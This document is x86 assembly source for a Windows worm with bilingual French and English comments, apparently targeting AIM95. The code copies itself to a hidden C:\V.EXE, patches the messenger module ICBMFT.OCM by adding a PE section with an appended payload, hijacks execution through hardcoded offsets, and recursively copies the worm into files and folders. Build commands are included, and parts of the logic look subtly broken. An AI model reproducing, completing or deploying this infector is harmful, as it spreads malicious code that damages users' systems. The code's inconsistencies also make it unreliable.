.386
.model flat, stdcall
option casemap:none

; -----------------------------------
; Déclarations des fonctions externes de l'API Windows
; Declarations of external Windows API functions
; FR: Chaque fonction utilisée doit être déclarée comme externe avec EXTRN.
; EN: Each used function must be declared as external with EXTRN.
; tasm32 /ml /m aimven.asm
; tlink32 /Tpe /aa /c aimven.obj,,,impor32.lib
; -----------------------------------
EXTRN GetCommandLineA:PROC
EXTRN CopyFileA:PROC
EXTRN SetFileAttributesA:PROC
EXTRN CreateFileA:PROC
EXTRN GetFileSize:PROC
EXTRN GlobalAlloc:PROC
EXTRN ReadFile:PROC
EXTRN GetModuleHandleA:PROC
EXTRN GetProcAddress:PROC
EXTRN SetFilePointer:PROC
EXTRN WriteFile:PROC
EXTRN CloseHandle:PROC
EXTRN GlobalFree:PROC
EXTRN ExitProcess:PROC

;includelib kernel32.lib

; -----------------------------------
; Section .data : Données statiques
; Cette section contient les variables et chaînes utilisées par le programme.
; Section .data: Static data
; This section contains variables and strings used by the program.
; -----------------------------------
.data
    NewFileName       db "C:\V.EXE", 0
    FileName          db "C:\PROGRA~1\AIM95\ICBMFT.OCM", 0
    ModuleName        db "kernel32.dll", 0
    ProcName          db "CopyFileA", 0
    aGetFileAttrib    db "GetFileAttributesA", 0
    aGlobalAlloc      db "GlobalAlloc", 0
    aGlobalFree       db "GlobalFree", 0
    ExistingFileName  db 260 dup(0)
    FileHandle        dd 0                ; Handle du fichier ouvert / Open file handle
    FileSize          dd 0                ; Taille du fichier à lire / Size of file to read
    BytesWritten      dd 0                ; Nombre d'octets écrits / Number of bytes written
    BufferPtr         dd 0                ; Pointeur vers le buffer mémoire / Pointer to memory buffer
    PEHeaderOffset    dd 0                ; Offset de l'en-tête PE / PE header offset
    SectionCount      dd 0                ; Nombre de sections dans le PE / Number of sections in PE
    ImageSize         dd 0                ; Taille totale de l'image PE / Total size of PE image
    ImageBase         dd 0                ; Adresse de base de l'image / Base address of image
    HardcodedAddr1    dd 11C12000h        ; Première adresse codée en dur / First hardcoded address
    HardcodedAddr2    dd 11C12038h        ; Deuxième adresse codée en dur / Second hardcoded address
    SavedOffset1      dd 0                ; Première valeur sauvegardée / First saved offset
    SavedOffset2      dd 0                ; Deuxième valeur sauvegardée / Second saved offset
    CopyFileAddr      dd 0                ; Adresse de la fonction CopyFileA / Address of CopyFileA function
    GetFileAttrAddr   dd 0                ; Adresse de GetFileAttributesA / Address of GetFileAttributesA
    GlobalAllocAddr   dd 0                ; Adresse de GlobalAlloc / Address of GlobalAlloc
    GlobalFreeAddr    dd 0                ; Adresse de GlobalFree / Address of GlobalFree

; -----------------------------------
; Section .code : Code exécutable
; Cette section contient le code principal et les sous-routines.
; Section .code: Executable code
; This section contains the main code and subroutines.
; -----------------------------------
.code
start proc
    ; FR: Récupérer la ligne de commande et extraire le nom du fichier.
    ; EN: Retrieve the command line and extract the filename.
    call GetCommandLineA
    inc eax
    mov esi, eax
    mov edi, offset ExistingFileName

parse_loop:
    cmp byte ptr [esi], 22h
    jz short parse_done
    movsb
    jmp short parse_loop

parse_done:
    mov byte ptr [edi], 0

    ; FR: Copier le ver à C:\V.EXE.
    ; EN: Copy the worm to C:\V.EXE.
    push 1
    push offset NewFileName
    push offset ExistingFileName
    call CopyFileA

    ; FR: Masquer le fichier copié.
    ; EN: Hide the copied file.
    push 4
    push offset NewFileName
    call SetFileAttributesA

    ; FR: Ouvre le fichier cible à infecter.
    ; EN: Open the target file to infect.
    push 0
    push 0
    push 3
    push 0
    push 0
    push 0C0000000h
    push offset FileName
    call CreateFileA
    cmp eax, 0FFFFFFFFh
    jnz short file_opened
    jmp exit_process

file_opened:
    mov FileHandle, eax
    push 0
    push eax
    call GetFileSize
    mov FileSize, eax

    add eax, 2000h
    push eax
    push 40h
    call GlobalAlloc
    mov BufferPtr, eax

    push 0
    push offset BytesWritten
    push FileSize
    push BufferPtr
    push FileHandle
    call ReadFile

    mov esi, BufferPtr
    cmp word ptr [esi], 5A4Dh
    jz short check_pe
    jmp cleanup

check_pe:
    add esi, 3Ch
    mov eax, [esi]
    mov PEHeaderOffset, eax
    sub eax, 3Ch
    add esi, eax
    cmp dword ptr [esi], 4550h
    jz short modify_pe
    jmp cleanup

modify_pe:
    mov ax, [esi+6]
    mov SectionCount, eax
    inc word ptr [esi+6]
    mov eax, [esi+28h]
    add eax, [esi+34h]
    mov edi, [esi+34h]
    mov ImageBase, edi
    mov eax, [esi+50h]
    mov ImageSize, eax
    add dword ptr [esi+50h], 1000h

    mov esi, BufferPtr
    add esi, PEHeaderOffset
    add esi, 0F8h
    mov eax, 28h
    mov ecx, SectionCount

section_loop:
    cmp dword ptr [esi], 7461642Eh
    jz short infect_section
    cmp dword ptr [esi], 6D69612Eh
    jz cleanup
    add esi, eax
    loop section_loop
    jmp write_section

infect_section:
    call sub_infect_section
    jmp write_section

write_section:
    mov dword ptr [esi], 6D69612Eh
    mov eax, 1000h
    mov [esi+8], eax
    mov eax, ImageSize
    mov [esi+0Ch], eax
    mov eax, 126h
    mov [esi+10h], eax
    mov eax, FileSize
    mov [esi+14h], eax
    mov eax, 0E0000020h
    mov [esi+24h], eax

    push offset ModuleName
    call GetModuleHandleA
    mov ebx, eax
    push offset ProcName
    push ebx
    call GetProcAddress
    mov CopyFileAddr, eax
    push offset aGetFileAttrib
    push ebx
    call GetProcAddress
    mov GetFileAttrAddr, eax
    push offset aGlobalAlloc
    push ebx
    call GetProcAddress
    mov GlobalAllocAddr, eax
    push offset aGlobalFree
    push ebx
    call GetProcAddress
    mov GlobalFreeAddr, eax

    mov edi, BufferPtr
    add edi, FileSize
    mov esi, offset payload_start
    mov ecx, payload_end - payload_start ; Taille exacte du payload
    rep movsb

    push 0
    push 0
    push 0
    push FileHandle
    call SetFilePointer
    mov eax, FileSize
    add eax, payload_end - payload_start ; Inclut la taille réelle du payload
    push 0
    push offset BytesWritten
    push eax
    push BufferPtr
    push FileHandle
    call WriteFile

cleanup:
    push FileHandle
    call CloseHandle
    push BufferPtr
    call GlobalFree

exit_process:
    push 0
    call ExitProcess
start endp

; -----------------------------------
; Sous-routine : sub_infect_section
; FR: Modifie la section .data pour rediriger l'exécution.
; EN: Modifies the .data section to redirect execution.
; -----------------------------------
sub_infect_section proc
    push esi
    push eax
    lea esi, [esi+8]
    mov eax, [esi]
    push eax
    add eax, 8
    mov [esi], eax
    pop eax
    lea esi, [esi+0Ch]
    mov ebx, [esi]
    add eax, ebx
    mov esi, BufferPtr
    add esi, eax
    mov ebx, HardcodedAddr1
    mov [esi], ebx
    add esi, 4
    mov ebx, HardcodedAddr2
    mov [esi], ebx
    mov esi, BufferPtr
    lea esi, [esi+8494h]
    cmp byte ptr [esi-2], 0FFh
    jnz cleanup
    mov ebx, [esi]
    mov SavedOffset1, ebx
    add eax, ImageBase
    mov [esi], eax
    mov esi, BufferPtr
    lea esi, [esi+87D2h]
    mov ebx, [esi]
    mov SavedOffset2, ebx
    add eax, 4
    mov [esi], eax
    cmp byte ptr [esi-2], 0FFh
    jnz cleanup
    pop eax
    pop esi
    ret
sub_infect_section endp

; -----------------------------------
; Payload : Code malveillant
; FR: Implémentation complète du payload pour infecter d'autres fichiers.
; EN: Full implementation of the payload to infect other files.
; -----------------------------------
payload_start:
    pusha                         ; Sauvegarde tous les registres / Save all registers

    ; FR: Récupère l'argument passé (pointeur vers une chaîne).
    ; EN: Retrieve the passed argument (pointer to a string).
    mov edi, [esp+20h+4]          ; Argument passé au payload / Argument passed to payload
    push edi
    mov eax, GetFileAttrAddr      ; Adresse de GetFileAttributesA / Address of GetFileAttributesA
    call [eax]                    ; Appelle GetFileAttributesA / Call GetFileAttributesA
    cmp eax, 0FFFFFFFFh           ; Vérifie si erreur / Check for error
    jnz short check_file_attr
    jmp short payload_exit

check_file_attr:
    xor al, al                    ; Prépare à scanner la chaîne / Prepare to scan string

scan_string:
    scasb                         ; Recherche la fin de la chaîne (null) / Search for string end (null)
    jnz short scan_string
    mov byte ptr [edi-4], 'e'     ; Ajoute ".exe" à la fin / Append ".exe" to the end
    mov byte ptr [edi-3], 'x'
    mov byte ptr [edi-2], 'e'
    mov edi, [esp+20h+4]          ; Restaure edi / Restore edi
    call infect_file              ; Appelle la sous-routine d'infection / Call infection subroutine

payload_exit:
    popa                          ; Restaure les registres / Restore registers
    mov eax, SavedOffset1         ; Récupère l'adresse originale sauvegardée / Retrieve saved original address
    jmp [eax]                     ; Saute à l'entrée originale / Jump to original entry point

; -----------------------------------
; Sous-routine : infect_file
; FR: Infecte un fichier en copiant le ver.
; EN: Infects a file by copying the worm.
; -----------------------------------
infect_file proc
    push edi                      ; Sauvegarde edi / Save edi
    mov eax, GetFileAttrAddr      ; Adresse de GetFileAttributesA / Address of GetFileAttributesA
    call [eax]                    ; Appelle GetFileAttributesA / Call GetFileAttributesA
    cmp eax, 0FFFFFFFFh           ; Vérifie si erreur / Check for error
    jnz short check_attr_value
    jmp short infect_exit

check_attr_value:
    cmp eax, 10h                  ; Vérifie si c'est un dossier (FILE_ATTRIBUTE_DIRECTORY) / Check if directory
    jnz short append_exe          ; Si pas un dossier, ajoute .exe / If not a directory, append .exe

    ; FR: Si c'est un dossier, alloue un buffer et construit un chemin.
    ; EN: If it's a directory, allocate a buffer and build a path.
    push 104h                     ; Taille du buffer (260 bytes) / Buffer size
    push 40h                      ; uFlags (GMEM_ZEROINIT) / Flags
    mov eax, GlobalAllocAddr
    call [eax]                    ; Appelle GlobalAlloc / Call GlobalAlloc
    test eax, eax
    jz short infect_exit          ; Si échec, sortie / If failure, exit
    push eax                      ; Sauvegarde le pointeur / Save pointer
    xchg esi, edi                 ; Échange esi et edi / Swap esi and edi
    mov edi, eax                  ; edi = nouveau buffer / edi = new buffer
    mov ecx, ebx                  ; Longueur de la chaîne / String length
    rep movsb                     ; Copie le chemin / Copy the path
    mov byte ptr [edi], 5Ch       ; Ajoute un backslash (\) / Add backslash
    inc edi
    mov esi, offset NewFileName   ; Pointeur vers "C:\V.EXE" / Pointer to "C:\V.EXE"
    mov ecx, 8                    ; Longueur de "C:\V.EXE" sans null / Length of "C:\V.EXE" without null
    rep movsb                     ; Copie "C:\V.EXE" / Copy "C:\V.EXE"
    pop edi                       ; edi = nouveau chemin / edi = new path
    call infect_file              ; Infection récursive / Recursive infection
    mov eax, GlobalFreeAddr
    call [eax]                    ; Libère le buffer / Free the buffer
    jmp short infect_exit

append_exe:
    ; FR: Ajoute .exe au nom du fichier et infecte.
    ; EN: Append .exe to filename and infect.
    mov byte ptr [edi+ebx-1], 'e' ; Ajoute ".exe" / Append ".exe"
    mov byte ptr [edi+ebx-2], 'x'
    mov byte ptr [edi+ebx-3], 'e'
    mov edi, [ebp-10h]            ; Restaure edi / Restore edi
    call infect_file              ; Infection récursive / Recursive infection

infect_exit:
    pop edi                       ; Restaure edi / Restore edi
    ret

infect_file endp


; -----------------------------------
; Sous-routine : do_infect
; FR: Effectue l'infection en appelant CopyFileA.
; EN: Performs the infection by calling CopyFileA.
; -----------------------------------
do_infect proc
    push 1                        ; bFailIfExists = TRUE
    push edi                      ; lpNewFileName (fichier cible) / Target filename
    push ebx                      ; lpExistingFileName (ver) / Worm filename
    mov eax, CopyFileAddr
    call [eax]                    ; Appelle CopyFileA / Call CopyFileA
    ret
do_infect endp

payload_end:

end start
